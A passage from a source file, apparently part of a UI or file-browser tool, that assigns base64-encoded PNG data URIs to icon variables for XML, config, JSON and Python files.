al1yzAB1gICMWxWJ3KiOME5A3RrJXpqN0jEVOsrplIVoM1lWgGarJNYqrotOMEjBHT9GrezKokjnIAMIAcpUYZyi5FgyNB1T3Tlzx5AGqBdd92MusIUIRSlSklhhyPNCDm+zvIBlaEizQnqcwoVITasmW0kmSUy8oUmEbQxChdRtTOFmGgMSG7rskxVFkXMkIjGdh0LJUJT7msN2ZO5bPvRYzvkbqLyTAYN4VhFRE2LTjblIkrZHK02n5fsDBCjUqDrTxsibPT9CreKh1YtQr3poSQlelimTurxjCFDqlWh5Npo9uoes7zz63c8NVYkVtuW9jwqmnE8pUWohKv+KAk5pU2GS1ISOLDzH0quirMgFVRYl+p1KDqB0SqSmdUV+yMIm+2tdoqkoqkQgpym1qkiHMV7s7D3wT9QTkxr5ncfvu1NP7xvGlnd/ssiLU3UmHMELlTZq6BqL0ky4pqEGcSI821LDKBKOZWlxlnHLMFTKUpqiKkxRWMYLOLqphPQbx1KDKOGe66h+GIuy66hBkgrHNFla5DLk6HdRlnPHsbkfZbGrqT9cfujWWwCkUg781uN4/2pA0opuc5lkDKkH6dL/n4dsP1Y2ndAd19+HwP8Ai6aBuBZQFcEAAAAASUVORK5CYII=",
            xml_icon = "data: image/png;base64,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",
            config_icon = "data: image/png;base64,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",
            json_icon = "data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAElElEQVRo3u2ZXUxbZRjH/8/5oB+04xtKpEygWeagskpcsjg/cLqoyy7ch5sOP+NC4m7cDO7CZCbuyiySJV6YRaJeyMacZDFTt2zJSFgicQuwhkgGsyIg0LiNr3Zt8bR9vKCwYk7LEUrLkj4XfZ+e877vOf8+v/O8z3kLpC1taXugjbR02ljf6iDCUQDZy7lYplE/81Bx4cEzDY+7kirgkXe+c3n9SjkDADODiObb6GOL+DnZJqqpLB8OhkK1377vSIgISUsnb0Ap44jPEdUcpV6rDwCCQFYJYlvdie6EiNAkIBzm6HsAM3N0q9UHz34lQokkilfqTnQ/u1wRmgTQHAaRGyIimmujjy3mg2anYmYWBCpNRCSkVGaQROCkScACDBKAUPTx5eKUMoSi5wTYKolLi0RKEUoETilHaGFk/z9OSUXI4/GQoiiQZZnV5ozG6bXGztpTh2tcqwohJUz4peNXWArzIAhCvK7WIKQ2AKWrSgARYUZYgz/d3uh1MVbnklX3DMynTkkHFQUcw189z4CaH+ccP1BpdEVLCa0IZWVmoCBLj99Hp1URqig28+2pAKbu/RNzTrXrrThCJoPEDXuqaV9tBZRgiKsOtKpi88Mn20iWRLS0ufj4WSd5/cHUIySLAlo+2orKtTloueTE1z85AWSo9t155DTe3l6NN7ZVo2ZdPl7++DKUUDi1CG2xW/BoWS7qPz3PP153Q8jIBKCOQ99dmT9suo525zBOHtnBW+wWXOkeSS1C8ux6xGNemUSdadHMI+pMGPPK82P/W9wlHaGufjeYGZs3WHDjjwlNYzZvsCAcDqOr3536LHTHE8SEJwBroUm1UFPzrYUmTHgCfMcTBINSh5DZINOhXXbkrjFw581RioPDAr/z5ijXbbXR0ddr0Ph9Dzx+JfkIHXhpPQ7tssNskPHV+U60trsASa9pbGu7C/bSTLy7owb7nqlAY2sPmi70JRchVvwAz25XCJIOJOs5snuxKEKCrIcg6SIYhsGKP/kIfXmhj5svdtMHezehfucm7hny0tn2AU0I7X6yjN96sYpOnruGz1quwcdGFmRDchEiSY8AGXCspQd7nrPDYcvH2fYBTWMdtnyMT/tx7FQPhIw8kPYfPPFZqCg/FzlmA4bck5qz0JB7EjlmGxcV5OLvSX9qFzKHLR9E4I5et+Ys1NHrZkEgctjycKlzZOUXsngRUIKzBZnVks03Bqa1rQNF2ZGxISwWtRWPwFXnMJy3xvjzg0/QU1XF+OZyP/cOTqpGoPLhHHrz+XV45elydt4ao6vOYRDJy4qApu31klebOZYAZoYRHm7Y+xjtf2EjlBDHLKd/a9pNskhovujk42e6yAdT3Fror9P7hRUXcH9d8FGmOIOCLD0PeY2qAtaa/XR7KoB7IR2TbKSovw6WLCBhb2QkG9kHIwY9iFlOD3oMDMEAElT2vFb2Gbj/mbyXek5cFgr6xkckY14JkmhB3/hIwgRMdHzxnmn99sOCpDMzwATQXBvZxFmyr3aOgzNeb9/PjQnLQgCJAOcBEJMUgBBIuAsOh5C2tKUtrv0LAgeIBBvynLwAAAAASUVORK5CYII=",
            python_icon = "data:image/png;base64,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",
